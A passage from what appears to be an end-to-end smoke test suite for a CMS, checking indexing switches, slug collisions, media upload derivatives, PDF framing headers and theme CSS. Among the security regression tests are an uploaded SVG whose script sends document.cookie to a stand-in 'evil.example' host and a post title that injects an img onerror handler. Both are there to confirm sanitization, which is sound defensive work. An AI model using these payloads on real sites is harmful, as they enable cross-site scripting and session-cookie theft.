    if (!/<loc>/.test(doors.sitemap)) ok('hidden: the sitemap lists no URL at all');
    else fail('hidden sitemap', 'still advertising URLs');
    if (!/<item>/.test(doors.rss)) ok('hidden: the feed publishes no item');
    else fail('hidden rss', 'still publishing items');
    if (/not published/i.test(doors.llms)) ok('hidden: llms.txt hands agents no API map');
    else fail('hidden llms.txt', doors.llms.slice(0, 120));
    let apiSpec = null;
    try { apiSpec = JSON.parse(doors.openapi); } catch { /* asserted below */ }
    if (apiSpec && Object.keys(apiSpec.paths ?? {}).length === 0) ok('hidden: openapi.json documents no endpoint');
    else fail('hidden openapi', `paths=${Object.keys(apiSpec?.paths ?? {}).length}`);

    // A hidden response is still a response: the gate returns early, before
    // the decoration every other reply gets, so it has to carry the headers
    // itself. The commerce 404 learned this the same way.
    const hiddenHeaders = await fetch(`${BASE}/llms.txt`);
    if (hiddenHeaders.headers.get('x-content-type-options') === 'nosniff'
      && hiddenHeaders.headers.get('x-frame-options')) {
      ok('hidden: the gated response still carries the security headers');
    } else fail('hidden security headers', 'the early return skipped the decoration');

    // ...and the switch turns back OFF. The string "false" is the trap: every
    // reader uses !!value, so a stored string would hide the site forever
    // while reporting success.
    await fetch(`${BASE}/api/settings/update`, {
      method: 'POST', headers: authed, body: JSON.stringify({ discourage_indexing: 'false' }),
    });
    const back = await (await fetch(`${BASE}/`)).text();
    if (!/name="robots"/.test(back)) ok('un-hidden: the string "false" really turns it off');
    else fail('un-hide via string', 'the site stayed hidden — "false" was stored truthy');
    const sm = await (await fetch(`${BASE}/sitemap.xml`)).text();
    if (/<loc>/.test(sm)) ok('un-hidden: the sitemap comes back');
    else fail('un-hide sitemap', 'sitemap still empty');

    // THE POSITIVE CASE, which is the one the guard exists for — and which
    // nothing asserted: a published home Page marked noindex must drop `/`
    // from the sitemap, because `/` really does serve that page and that page
    // really does say not to index it. This branch shipped that guard twice
    // without it working (once as dead code, once disabled by a stray edit)
    // and the suite stayed green both times.
    const hiddenHomeSlug = `smoke-hidden-home-${Date.now().toString(36)}`;
    const hiddenHome = await (await fetch(`${BASE}/api/posts`, {
      method: 'POST', headers: authed,
      body: JSON.stringify({
        title: 'Hidden front door', slug: hiddenHomeSlug, content: '<p>x</p>',
        status: 'published', kind: 'page', noindex: true,
      }),
    })).json();
    if (hiddenHome?.data?.id) ok('hidden-home setup: a published noindexed Page exists');
    else fail('hidden-home setup', JSON.stringify(hiddenHome?.data)?.slice(0, 140));
    await fetch(`${BASE}/api/settings/update`, {
      method: 'POST', headers: authed, body: JSON.stringify({ home_page_slug: hiddenHomeSlug }),
    });
    const hiddenHomeSitemap = await (await fetch(`${BASE}/sitemap.xml`)).text();
    const hiddenHomeHtml = await (await fetch(`${BASE}/`)).text();
    const rootAdvertised = new RegExp(`<loc>[^<]*/</loc>`).test(hiddenHomeSitemap);
    const rootNoindexed = /<meta name="robots" content="noindex"/.test(hiddenHomeHtml);
    if (rootNoindexed && !rootAdvertised) {
      ok('a published noindexed home page drops / from the sitemap');
    } else fail('hidden home in sitemap', `rootAdvertised=${rootAdvertised} rootNoindexed=${rootNoindexed}`);

    // A DRAFT designated as home does not render at `/` — the stock homepage
    // does, and it is perfectly indexable. Hiding `/` because of a flag on a
    // page nobody can see would delist the site's most important URL. This is
    // the over-correction the first version of the home-page guard shipped.
    const draftSlug = `smoke-draft-home-${Date.now().toString(36)}`;
    const draftHome = await (await fetch(`${BASE}/api/posts`, {
      method: 'POST', headers: authed,
      body: JSON.stringify({
        title: 'Work in progress', slug: draftSlug, content: '<p>x</p>',
        status: 'draft', kind: 'page', noindex: true,
      }),
    })).json();
    // Assert the PRECONDITION. Without this, a create that stops honouring
    // kind/status/noindex leaves home_page_slug pointing at nothing, and the
    // assertion below passes while testing nothing at all.
    if (draftHome?.data?.kind === 'page' && draftHome.data.status === 'draft' && draftHome.data.noindex === true) {
      ok('draft-home setup: a noindexed draft Page really was created');
    } else fail('draft-home setup', JSON.stringify(draftHome?.data)?.slice(0, 140));
    await fetch(`${BASE}/api/settings/update`, {
      method: 'POST', headers: authed, body: JSON.stringify({ home_page_slug: draftSlug }),
    });
    const withDraftHome = await (await fetch(`${BASE}/sitemap.xml`)).text();
    const rootListed = new RegExp(`<loc>[^<]*/</loc>`).test(withDraftHome);
    const rootHtml = await (await fetch(`${BASE}/`)).text();
    if (rootListed && !/name="robots"/.test(rootHtml)) {
      ok('a hidden DRAFT home page does not delist / (the stock page renders there)');
    } else fail('draft home delisting', `rootListed=${rootListed} robotsOnRoot=${/name="robots"/.test(rootHtml)}`);
    // An article and a Page must never be able to share a slug — the sitemap
    // and the homepage resolve the designated home differently, and when two
    // records answer to one slug each picks whichever was created first. The
    // update path used to accept the collision.
    const clashSlug = `smoke-clash-${Date.now().toString(36)}`;
    const art = await (await fetch(`${BASE}/api/posts`, {
      method: 'POST', headers: authed,
      body: JSON.stringify({ title: 'An article', slug: clashSlug, status: 'published' }),
    })).json();
    const pg = await (await fetch(`${BASE}/api/posts`, {
      method: 'POST', headers: authed,
      body: JSON.stringify({ title: 'A page', slug: `${clashSlug}-page`, kind: 'page', status: 'published' }),
    })).json();
    if (!art?.data?.id || !pg?.data?.id) {
      fail('post slug collision setup', `article=${!!art?.data?.id} page=${!!pg?.data?.id}`);
    }
    if (art?.data?.id && pg?.data?.id) {
      const steal = await fetch(`${BASE}/api/posts/${pg.data.id}`, {
        method: 'PUT', headers: authed, body: JSON.stringify({ slug: clashSlug }),
      });
      if (steal.status === 400) ok('a post cannot take a slug another record already holds');
      else fail('post slug collision on update', `expected 400, got ${steal.status}`);

      const keepOwn = await fetch(`${BASE}/api/posts/${pg.data.id}`, {
        method: 'PUT', headers: authed, body: JSON.stringify({ slug: `${clashSlug}-page`, title: 'A page v2' }),
      });
      if (keepOwn.status === 200) ok('...but it can keep its own');
      else fail('post keeps own slug', `status=${keepOwn.status}`);

      // CONCURRENTLY, which the service-level pre-check cannot see: four posts
      // renamed to one free slug at once. Exactly one may win — the check has
      // to live inside the write, as it does for create.
      const targets = [];
      for (let i = 0; i < 4; i += 1) {
        const r = await (await fetch(`${BASE}/api/posts`, {
          method: 'POST', headers: authed,
          body: JSON.stringify({ title: `Racer ${i}`, slug: `${clashSlug}-r${i}`, status: 'draft' }),
        })).json();
        if (r?.data?.id) targets.push(r.data.id);
      }
      const wanted = `${clashSlug}-wanted`;
      const outcomes = await Promise.all(targets.map((tid) =>
        fetch(`${BASE}/api/posts/${tid}`, { method: 'PUT', headers: authed, body: JSON.stringify({ slug: wanted }) })
          .then((r) => r.status).catch(() => 0)));
      const winners = outcomes.filter((st) => st === 200).length;
      const holders = (await (await fetch(`${BASE}/api/posts?kind=all&limit=200`, { headers: { Cookie: sessionCookie } })).json())
        ?.data?.filter((p) => p.slug === wanted).length ?? 0;
      if (targets.length === 4 && winners === 1 && holders === 1) {
        ok('four CONCURRENT renames to one slug: exactly one wins');
      } else fail('concurrent rename', `created=${targets.length} winners=${winners} holders=${holders} statuses=${outcomes.join(',')}`);
    }

    await fetch(`${BASE}/api/settings/update`, {
      method: 'POST', headers: authed, body: JSON.stringify({ home_page_slug: '' }),
    });
  }

  // 8e2. Legal templates: activate one in Greek, prove it lands as a DRAFT
  // with the fill-in markers visible, publish it, and read it back through
  // the public site (i.e. through the active theme's PageArticle slot).
  if (sessionCookie && csrfToken) {
    const authed = {
      Cookie: `${sessionCookie}; astrobaas_csrf=${csrfToken}`,
      'Content-Type': 'application/json',
      'X-CSRF-Token': csrfToken,
    };

    const list = await (await fetch(`${BASE}/api/legal/templates`, { headers: { Cookie: sessionCookie } })).json();
    if (Array.isArray(list?.data) && list.data.some((t) => t.id === 'privacy') && list.data.some((t) => t.id === 'returns')) {
      ok('legal templates: library lists (returns present — commerce is on)');
    } else fail('legal templates list', JSON.stringify(list?.data)?.slice(0, 120));

    const act = await fetch(`${BASE}/api/legal/templates`, {
      method: 'POST', headers: authed, body: JSON.stringify({ id: 'privacy', locale: 'el' }),
    });
    const actJson = await act.json().catch(() => null);
    if (act.status === 201 && actJson?.data?.slug === 'politiki-aporritou') ok('legal templates: Greek privacy activates as a draft');
    else fail('legal template activate', `status=${act.status} ${JSON.stringify(actJson?.data)}`);

    if (actJson?.data?.id) {
      // Fresh install: trader fields are unset, so markers must be VISIBLE.
      const draft = await (await fetch(`${BASE}/api/posts/${actJson.data.id}`, { headers: { Cookie: sessionCookie } })).json();
      const draftBody = draft?.data?.content || '';
      if (draft?.data?.status === 'draft' && draft?.data?.kind === 'page' && draftBody.includes('συμπληρώστε')) {
        ok('legal templates: draft page carries visible fill-in markers');
      } else fail('legal template draft', `status=${draft?.data?.status} markers=${draftBody.includes('συμπληρώστε')}`);

      const dupe = await fetch(`${BASE}/api/legal/templates`, {
        method: 'POST', headers: authed, body: JSON.stringify({ id: 'privacy', locale: 'el' }),
      });
      if (dupe.status === 409) ok('legal templates: double activation refused (409)');
      else fail('legal template dupe', `expected 409, got ${dupe.status}`);

      const pub = await fetch(`${BASE}/api/posts/${actJson.data.id}`, {
        method: 'PUT', headers: authed, body: JSON.stringify({ status: 'published' }),
      });
      if (pub.status === 200) ok('legal templates: draft publishes like any page');
      else fail('legal template publish', `status=${pub.status}`);

      const publicPage = await fetch(`${BASE}/el/politiki-aporritou`);
      const publicHtml = await publicPage.text();
      if (publicPage.status === 200 && publicHtml.includes('Πολιτική Απορρήτου')) {
        ok('legal templates: published page renders through the theme');
      } else fail('legal template public render', `status=${publicPage.status}`);
    }
  }

  // 8f. Admin pages render for an authenticated admin (catch un-gated/stale pages)
  if (sessionCookie) {
    for (const [pth, marker] of [
      ['/admin/messages', 'Messages'],
      ['/admin/themes', 'Customize'],
      ['/admin/plugins', 'plugin-toggle'],
    ]) {
      const r = await fetch(`${BASE}${pth}`, { headers: { Cookie: sessionCookie } });
      const html = r.status === 200 ? await r.text() : '';
      if (r.status === 200 && html.includes(marker)) ok(`GET ${pth} (admin) → 200, real page`);
      else fail(`GET ${pth}`, `status=${r.status}, marker "${marker}" ${html.includes(marker) ? 'present' : 'MISSING'}`);
    }
  }

  // 8e. Public blog renders with category + pagination params (no SSR 500)
  for (const p of ['/blog', '/blog?category=technology', '/blog?page=2', '/about', '/contact']) {
    const r = await fetch(`${BASE}${p}`);
    if (r.status === 200) ok(`GET ${p} → 200`);
    else fail(`GET ${p}`, `status=${r.status}`);
  }

  // 8f. Media upload: exercises the sharp image pipeline end-to-end. This is the
  // one route that feeds attacker-supplied bytes to an image decoder, so it gets
  // explicit coverage: a real PNG must come back re-encoded as webp (proving the
  // pipeline ran, not the raw-file fallback), be fetchable over HTTP, and produce
  // a thumbnail when wider than 400px. SVG must still be refused.
  // Captured for the CLS section far below: it has to assert against
  // dimensions the image pipeline actually wrote, not a fixture that agrees
  // with itself.
  let uploadedImageUrl = '';
  let uploadedImageId = '';
  if (sessionCookie && csrfToken) {
    const uploadHeaders = {
      Cookie: `${sessionCookie}; astrobaas_csrf=${csrfToken}`,
      'X-CSRF-Token': csrfToken,
    };
    // Synthesize a 600x400 PNG fixture (sharp is available in the test env).
    let pngFixture = null;
    try {
      const sharpMod = await import('sharp');
      const sharpFn = sharpMod.default ?? sharpMod;
      pngFixture = await sharpFn({
        create: { width: 600, height: 400, channels: 3, background: { r: 10, g: 120, b: 200 } },
      })
        .png()
        .toBuffer();
    } catch (e) {
      fail('media upload fixture', `could not synthesize PNG: ${e.message}`);
    }

    if (pngFixture) {
      const fd = new FormData();
      fd.append('file', new File([pngFixture], 'smoke-shot.png', { type: 'image/png' }));
      fd.append('alt_text', 'smoke fixture');
      const r = await fetch(`${BASE}/api/media/upload`, { method: 'POST', headers: uploadHeaders, body: fd });
      const j = await r.json().catch(() => null);
      const d = j?.data;
      if (r.status === 201 && d?.mime_type === 'image/webp' && /\.webp$/.test(d?.url || '')) {
        ok('media upload: PNG re-encoded to webp by the image pipeline');
      } else {
        fail('media upload webp pipeline', `status=${r.status} mime=${d?.mime_type} url=${d?.url}`);
      }
      // The stored asset must actually be served.
      if (d?.url) {
        const got = await fetch(`${BASE}${d.url}`);
        const ct = got.headers.get('content-type') || '';
        if (got.status === 200 && ct.includes('image/webp')) ok('media upload: stored webp is served over HTTP');
        else fail('media upload fetch', `status=${got.status} ct=${ct}`);
      }
      /* ---- derivatives, dimensions and absolute urls ----
       *
       * A media record used to carry one 400px thumbnail and no dimensions, so
       * every storefront had to run its own image optimizer — one shop
       * accumulated 632 MB across 31,349 generated files against a 1 GB
       * ceiling. And the record's url was relative to the CMS, so a storefront
       * on another host rendered broken images.
       *
       * These assertions are on the STORED record read back, not on the upload
       * response: the previous thumbnail bug survived a full test suite
       * precisely because the suite asserted on the response, and the database
       * had never heard of the field.
       */
      if (typeof d?.width === 'number' && typeof d?.height === 'number' && d.width > 0 && d.height > 0) {
        ok('media upload: dimensions recorded');
      } else fail('media dimensions', `width=${d?.width} height=${d?.height}`);

      if (Array.isArray(d?.variants) && d.variants.length >= 2) {
        ok(`media upload: ${d.variants.length} derivatives generated at upload`);
      } else fail('media derivatives', `variants=${JSON.stringify(d?.variants)}`);

      if (Array.isArray(d?.variants)) {
        const ascending = d.variants.every((v, i) => i === 0 || v.width > d.variants[i - 1].width);
        if (ascending) ok('media upload: derivatives are ascending by width');
        else fail('derivative order', JSON.stringify(d.variants.map((v) => v.width)));

        // Never upscaled: a variant wider than the source would be a blurrier,
        // larger file than the original.
        if (d.variants.every((v) => v.width <= d.width)) ok('media upload: no derivative is an upscale');
        else fail('derivative upscale', `source=${d.width} widths=${d.variants.map((v) => v.width)}`);

        // Every derivative is actually on disk and served.
        let served = 0;
        for (const v of d.variants) {
          const g = await fetch(`${BASE}${v.url}`);
          if (g.status === 200 && (g.headers.get('content-type') || '').includes('image/webp')) served += 1;
        }
        if (served === d.variants.length) ok('media upload: every derivative is fetchable as webp');
        else fail('derivative serving', `${served}/${d.variants.length} fetchable`);

        // Each carries its own width and height so a storefront can build a
        // srcset without opening the files.
        if (d.variants.every((v) => v.width > 0 && v.height > 0 && v.size > 0)) {
          ok('media upload: each derivative carries its own width, height and size');
        } else fail('derivative metadata', JSON.stringify(d.variants));
      }

      // The ORIGINAL is kept and downloadable. It used to be unlinked after
      // re-encoding, which threw away the master copy of the shop's own photo.
      if (d?.original_url) {
        const o = await fetch(`${BASE}${d.original_url}`);
        if (o.status === 200) ok('media upload: the untouched original is kept and downloadable');
        else fail('original retention', `status=${o.status} url=${d.original_url}`);
      } else fail('original retention', 'no original_url on the record');

      // Absolute urls: what a storefront on another host actually needs.
      if (typeof d?.url_absolute === 'string' && /^https?:\/\//.test(d.url_absolute)
          && d.url_absolute.endsWith(d.url)) {
        ok('media upload: url_absolute is an absolute form of url');
      } else fail('url_absolute', `${d?.url_absolute} vs ${d?.url}`);

      if (typeof j?.meta?.media_base === 'string' && /^https?:\/\//.test(j.meta.media_base)) {
        ok('media upload: the envelope publishes media_base');
      } else fail('media_base on upload', JSON.stringify(j?.meta));

      // ...and the RELATIVE fields are untouched, so every existing consumer
      // (this suite included, which does `${BASE}${d.url}`) still works.
      if (d?.url?.startsWith('/uploads/')) ok('media upload: url stays relative for existing consumers');
      else fail('url compatibility', `url=${d?.url}`);
      if (d?.url?.startsWith('/uploads/')) uploadedImageUrl = d.url;
      if (d?.id) uploadedImageId = d.id;

      /* ---- the inline PDF viewer, end to end -------------------------------
       *
       * The unit suite proves the URL rule and the markup. What it cannot
       * prove is the half of the feature that lives in a HEADER: a frame whose
       * response says `X-Frame-Options: DENY` renders as a blank box, and the
       * unit test for `frameOptionsFor` would pass all the same. So this asks
       * a running server.
       *
       * It also pins the narrowness, which is the security half. An exception
       * that quietly widened to every upload — or to the admin — is the bug
       * this feature could introduce, and it would introduce it silently.
       */
      {
        // Smallest thing that satisfies the magic-byte sniff and is a real,
        // openable document: header, one empty page, trailer.
        const pdfBytes = Buffer.from(
          '%PDF-1.4\n'
          + '1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj\n'
          + '2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj\n'
          + '3 0 obj<</Type/Page/Parent 2 0 R/MediaBox[0 0 200 200]>>endobj\n'
          + 'trailer<</Root 1 0 R>>\n%%EOF\n',
          'latin1',
        );
        const pdfFd = new FormData();
        pdfFd.append('file', new File([pdfBytes], 'smoke-doc.pdf', { type: 'application/pdf' }));
        const up = await fetch(`${BASE}/api/media/upload`, { method: 'POST', headers: uploadHeaders, body: pdfFd });
        const upJson = await up.json().catch(() => null);
        const pdf = upJson?.data;

        if (up.status === 201 && pdf?.mime_type === 'application/pdf' && /\.pdf$/.test(pdf?.url || '')) {
          ok('pdf: a PDF uploads and keeps its type');
        } else fail('pdf upload', `status=${up.status} ${JSON.stringify(upJson)?.slice(0, 200)}`);

        if (pdf?.url) {
          const served = await fetch(`${BASE}${pdf.url}`);
          const xfo = (served.headers.get('x-frame-options') || '').toUpperCase();
          const type = served.headers.get('content-type') || '';

          if (served.status === 200 && type.includes('application/pdf')) ok('pdf: served as application/pdf');
          else fail('pdf serving', `status=${served.status} type=${type}`);

          // The whole feature depends on this one word.
          if (xfo === 'SAMEORIGIN') ok('pdf: the uploaded PDF may be framed by this origin');
          else fail('pdf frame header', `x-frame-options=${xfo || '(absent)'} — the viewer will render blank`);

          if ((served.headers.get('x-content-type-options') || '') === 'nosniff') {
            ok('pdf: still nosniff');
          } else fail('pdf nosniff', 'the relaxed frame rule must not have dropped anything else');
        }

        // …and nothing else moved.
        for (const [path, what] of [
          [uploadedImageUrl, 'an image upload'],
          ['/admin', 'the admin'],
          ['/', 'the public home page'],
        ]) {
          if (!path) continue;
          const r2 = await fetch(`${BASE}${path}`, { headers: { Cookie: sessionCookie } });
          const xfo2 = (r2.headers.get('x-frame-options') || '').toUpperCase();
          if (xfo2 === 'DENY') ok(`pdf: ${what} is still DENY`);
          else fail('frame exception too wide', `${path} answered x-frame-options=${xfo2 || '(absent)'}`);
        }

        // The reader's half: a post that embeds the PDF must come back with a
        // real viewer in the rendered body, through the same pipeline a
        // headless storefront reads.
        if (pdf?.url) {
          const create = await fetch(`${BASE}/api/posts`, {
            method: 'POST',
            // The CSRF cookie has to travel WITH the header — double-submit
            // compares the two, and a session cookie alone is a 403.
            headers: { ...uploadHeaders, 'Content-Type': 'application/json' },
            body: JSON.stringify({
              title: `PDF viewer ${Date.now()}`,
              status: 'published',
              content: `<p>Here it is.</p><figure class="ab-pdf"><a href="${pdf.url}">Smoke document</a></figure>`,
            }),
          });
          const created = await create.json().catch(() => ({}));
          const slug = created?.data?.slug;
          if (slug) {
            const got = await fetch(`${BASE}/api/posts/${slug}`);
            const body = (await got.json().catch(() => ({})))?.data?.content_rendered || '';
            if (body.includes('ab-pdf-frame') && body.includes(`src="${pdf.url}#view=FitH"`)) {
              ok('pdf: an embedded PDF renders as a viewer in content_rendered');
            } else fail('pdf render', `content_rendered had no frame: ${body.slice(0, 200)}`);
            if (body.includes('ab-pdf-download')) ok('pdf: the download link survives beside the frame');
            else fail('pdf download link', 'no way out for a reader whose browser will not show it');
          } else fail('pdf render', `could not create the post: ${JSON.stringify(created).slice(0, 200)}`);
        }
      }

      // Read the record BACK. The response is not the database.
      {
        const list = await fetch(`${BASE}/api/media/get`, { headers: { Cookie: sessionCookie } });
        const lj = await list.json().catch(() => ({}));
        const stored = (lj.data || []).find((m) => m.id === d?.id);
        if (stored && Array.isArray(stored.variants) && stored.variants.length === d.variants?.length) {
          ok('media upload: the derivatives are in the DATABASE, not just the response');
        } else fail('stored derivatives', JSON.stringify(stored?.variants));
        if (stored && typeof stored.width === 'number') ok('media list: stored dimensions come back');
        else fail('stored dimensions', JSON.stringify(stored?.width));
        if (typeof lj?.meta?.media_base === 'string') ok('media list: the envelope publishes media_base');
        else fail('media_base on list', JSON.stringify(lj?.meta));
        if (stored && typeof stored.url_absolute === 'string') ok('media list: records carry url_absolute');
        else fail('list url_absolute', JSON.stringify(stored?.url_absolute));
      }

      // 600px wide → a 400px thumbnail should exist and be fetchable.
      if (d?.thumb_url) {
        const t = await fetch(`${BASE}${d.thumb_url}`);
        if (t.status === 200) ok('media upload: thumbnail generated for a >400px image');
        else fail('media upload thumbnail', `status=${t.status}`);
      } else {
        fail('media upload thumbnail', 'no thumb_url for a 600px-wide image');
      }
    }

    // SVG is accepted SANITIZED: the hostile parts die at upload, the stored
    // file is the clean serialization, and serving adds a per-file CSP. This
    // uploads an actual attack file and reads back what the server serves.
    const svgFd = new FormData();
    svgFd.append(
      'file',
      new File([
        '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10" onload="alert(1)">'
        + '<script>fetch("https://evil.example/steal?c="+document.cookie)</script>'
        + '<foreignObject><iframe src="https://evil.example"></iframe></foreignObject>'
        + '<rect width="5" height="5" fill="#e2442f"/></svg>',
      ], 'logo.svg', { type: 'image/svg+xml' }),
    );
    const svgRes = await fetch(`${BASE}/api/media/upload`, { method: 'POST', headers: uploadHeaders, body: svgFd });
    const svgJson = await svgRes.json().catch(() => null);
    if (svgRes.status === 201 && svgJson?.data?.url?.endsWith('.svg')) ok('media upload: hostile SVG accepted as .svg');
    else fail('media upload: hostile SVG accepted', `status=${svgRes.status} url=${svgJson?.data?.url}`);
    if (svgJson?.data?.url) {
      const served = await fetch(`${BASE}${svgJson.data.url}`);
      const servedBody = await served.text();
      const servedType = served.headers.get('content-type') || '';
      const servedCsp = served.headers.get('content-security-policy') || '';
      if (served.status === 200 && servedType.startsWith('image/svg+xml')) ok('svg serving: image/svg+xml content type');
      else fail('svg serving content type', `status=${served.status} type=${servedType}`);
      if (!servedBody.includes('<script') && !servedBody.includes('evil.example')
        && !servedBody.includes('onload') && !servedBody.includes('foreignObject')
        && servedBody.includes('<rect')) ok('svg serving: script/handler/foreignObject stripped, drawing intact');
      else fail('svg sanitization on disk', servedBody.slice(0, 200));
      if (servedCsp.includes("default-src 'none'")) ok('svg serving: per-file CSP present');
      else fail('svg serving CSP', `csp=${servedCsp}`);
      if (svgJson.data.width === 10 && svgJson.data.height === 10) ok('svg upload: dimensions read from viewBox');
      else fail('svg dimensions', `w=${svgJson.data.width} h=${svgJson.data.height}`);
    }

    // A raster wearing an .svg name must stay a raster: structure decides.
    const fakeSvgFd = new FormData();
    fakeSvgFd.append('file', new File([Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a])], 'fake.svg', { type: 'image/svg+xml' }));
    const fakeRes = await fetch(`${BASE}/api/media/upload`, { method: 'POST', headers: uploadHeaders, body: fakeSvgFd });
    const fakeJson = await fakeRes.json().catch(() => null);
    if (fakeRes.status !== 201 || !fakeJson?.data?.url?.endsWith('.svg')) ok('a PNG named .svg is not stored as SVG');
    else fail('png-as-svg', `stored as ${fakeJson?.data?.url}`);
  }

  // 8g. Theme customizer save → persists into active theme, applied on SSR.
  if (sessionCookie && csrfToken) {
    const r = await fetch(`${BASE}/api/themes/update`, {
      method: 'POST',
      headers: {
        Cookie: `${sessionCookie}; astrobaas_csrf=${csrfToken}`,
        'Content-Type': 'application/json',
        'X-CSRF-Token': csrfToken,
      },
      body: JSON.stringify({ settings: { primaryColor: '#abcdef' } }),
    });
    if (r.status === 200) ok('POST /api/themes/update → 200');
    else fail('POST /api/themes/update', `status=${r.status}`);

    // Round-trips through the flat get endpoint (standard {success,data} shape).
    const g = await fetch(`${BASE}/api/themes/get`);
    const gj = await g.json().catch(() => null);
    if (gj?.data?.settings?.primaryColor === '#abcdef') ok('GET /api/themes/get reflects saved color');
    else fail('theme get round-trip', JSON.stringify(gj));

    // Theme tokens are served as an external, CSP-safe stylesheet (/theme.css)
    // and linked from every page (replacing the old inline <html> style, which a
    // hash-based CSP would block). Verify both: the link is present and the
    // stylesheet carries the saved color.
    const home = await fetch(`${BASE}/`);
    const html = await home.text();
    const linksTheme = /<link[^>]+href="\/theme\.css"/.test(html);
    const noInlineHtmlStyle = !/<html[^>]*\sstyle=/.test(html);
    const css = await (await fetch(`${BASE}/theme.css`)).text();
    if (linksTheme && noInlineHtmlStyle && /--primary-color:\s*#abcdef/.test(css)) {
      ok('Theme served via external /theme.css (CSP-safe) with saved color');
    } else {
      fail('theme SSR injection', `link=${linksTheme} noInline=${noInlineHtmlStyle} cssHasColor=${/--primary-color:\s*#abcdef/.test(css)}`);
    }

    // --- review regressions ---
    // A review of this session's work found four defects that every existing
    // assertion missed. These pin them, each testing the STORED state or the
    // RENDERED output rather than the response that happened to look right.
    {
      const rvHdrs = {
        Cookie: `${sessionCookie}; astrobaas_csrf=${csrfToken}`,
        'Content-Type': 'application/json',
        'X-CSRF-Token': csrfToken,
      };

      // A post title is validated as a length-bounded string, not as HTML, so
      // `</script>` in one used to close the JSON-LD block and everything after
      // it was parsed as markup — in <head>, on a public page, authored by the
      // lowest role that can write a post.
      const evilSlug = `smoke-jsonld-${Date.now().toString(36)}`;
      await fetch(`${BASE}/api/posts`, {
        method: 'POST', headers: rvHdrs,
        body: JSON.stringify({
          title: 'Breakout </script><img src=x onerror=alert(1)>',
          slug: evilSlug, content: '<p>x</p>', status: 'published',
        }),
      });
      const evilHtml = await (await fetch(`${BASE}/blog/${evilSlug}`)).text();
      const ldBlock = evilHtml.match(/<script type="application\/ld\+json"[^>]*>([\s\S]*?)<\/script>/);

      // The precise question is whether the title can terminate the SCRIPT
      // element, not whether the characters appear on the page.
      //
      // Two wrong assertions were tried before this one:
      //   - grepping the captured block: a non-greedy match stops at the FIRST
      //     `</script>`, which when the injection works is the INJECTED one, so
      //     the capture excludes the payload and the check passes vacuously.
      //   - grepping the whole page: the title also lands in
      //     `<meta property="og:title" content="…">`, where `<` is inert and
      //     Astro escapes `"` to `&quot;`. That is safe, so the check failed on
      //     correct code.
      //
      // What actually proves it: the captured block must still parse as JSON
      // AND round-trip the title. If the element were terminated early the
      // capture is truncated, and JSON.parse fails.
      if (ldBlock) {
        let parsed = null;
        try { parsed = JSON.parse(ldBlock[1]); } catch { /* reported below */ }
        // Found by TYPE, not by position: the graph also carries the
        // Organization the article's publisher references, and an assertion
        // that depends on node order breaks for correct changes.
        const headline = (parsed?.['@graph'] ?? [])
          .find((n) => n['@type'] === 'BlogPosting')?.headline;
        if (parsed && headline && headline.includes('</script>')) {
          ok('a hostile post title cannot terminate the JSON-LD element');
        } else if (!parsed) {
          fail('JSON-LD injection', 'the block no longer parses — the element was terminated early');
        } else {
          fail('JSON-LD headline', `round-trip lost the title: ${JSON.stringify(headline)?.slice(0, 80)}`);
        }
      } else fail('JSON-LD block', 'no ld+json block in the rendered page');

      // The thumbnail must be in the STORED record. The previous assertion read
      // the upload RESPONSE, which carried the fields even when the database
      // did not — which is exactly how the bug survived a green suite.
      const png1x1 = Buffer.from(
        '89504e470d0a1a0a0000000d4948445200000002000000020806000000f478d4fa0000001849444154789c636460606060f80f000601010021d5e2b40000000049454e44ae426082',
        'hex');
      const fd = new FormData();
      fd.append('file', new Blob([png1x1], { type: 'image/png' }), 'roundtrip.png');
      const upRes = await fetch(`${BASE}/api/media/upload`, {
        method: 'POST',
        headers: { Cookie: `${sessionCookie}; astrobaas_csrf=${csrfToken}`, 'X-CSRF-Token': csrfToken },
        body: fd,
      });
      const upJson = await upRes.json().catch(() => null);
      const upId = upJson?.data?.id;
      if (upId) {
        const listed = await (await fetch(`${BASE}/api/media/get`, { headers: rvHdrs })).json().catch(() => null);
        const stored = (listed?.data ?? []).find((m) => m.id === upId);
        // Dimensions are the field that proves the record — not the response —
        // carries the derived data.
        if (stored && typeof stored.width === 'number' && typeof stored.height === 'number') {
          ok('image dimensions are in the STORED media record, not just the response');
        } else fail('media derived fields not persisted', JSON.stringify(stored)?.slice(0, 160));

        // The file the record points at must actually exist. A WebP upload used
        // to delete its own stored file and leave the record pointing at
        // nothing.
        const fileRes = await fetch(`${BASE}${stored?.url ?? '/nope'}`);
        if (fileRes.status === 200) ok('the file a media record points at actually exists');
        else fail('upload deleted its own file', `GET ${stored?.url} -> ${fileRes.status}`);
      } else fail('media upload for round-trip', JSON.stringify(upJson)?.slice(0, 160));

      // The change feed used to sort its own cached array descending, which made
      // the ring buffer evict the NEWEST records on the next write.
      const beforeFeed = await (await fetch(`${BASE}/api/content/changes`, { headers: rvHdrs })).json().catch(() => null);
      const beforeCount = (beforeFeed?.data ?? []).length;
      const probeSlug = `smoke-feed-${Date.now().toString(36)}`;
      await fetch(`${BASE}/api/posts`, {
        method: 'POST', headers: rvHdrs,
        body: JSON.stringify({ title: 'Feed probe', slug: probeSlug, content: '<p>x</p>', status: 'published' }),
      });
      const afterFeed = await (await fetch(`${BASE}/api/content/changes`, { headers: rvHdrs })).json().catch(() => null);
      const afterRows = afterFeed?.data ?? [];
      // The newest record must be present after a poll-then-write cycle.
      if (afterRows.length >= beforeCount) ok('polling the change feed does not shrink it');
      else fail('change feed lost records', `${beforeCount} -> ${afterRows.length}`);
    }

    // --- SEO output actually reaches the page ---
    // meta_title/meta_description were declared on the model, validated with
    // max lengths, stored by the admin's "SEO Settings" panel, and rendered
    // NOWHERE. The Site URL setting was equally inert. Both are the same shape
    // as the theme tokens that saved successfully and changed nothing, so
    // these assert the rendered HTML rather than the stored value.
    {
      const seoHdrs = {
        Cookie: `${sessionCookie}; astrobaas_csrf=${csrfToken}`,
        'Content-Type': 'application/json',
        'X-CSRF-Token': csrfToken,
      };
      await fetch(`${BASE}/api/settings/update`, {
        method: 'POST', headers: seoHdrs,
        body: JSON.stringify({ site_url: 'https://smoke-seo.example.com' }),
      });

      const seoSlug = `smoke-seo-${Date.now().toString(36)}`;
      await fetch(`${BASE}/api/posts`, {
        method: 'POST', headers: seoHdrs,
        body: JSON.stringify({
          title: 'Visible Title', slug: seoSlug, content: '<p>body</p>',
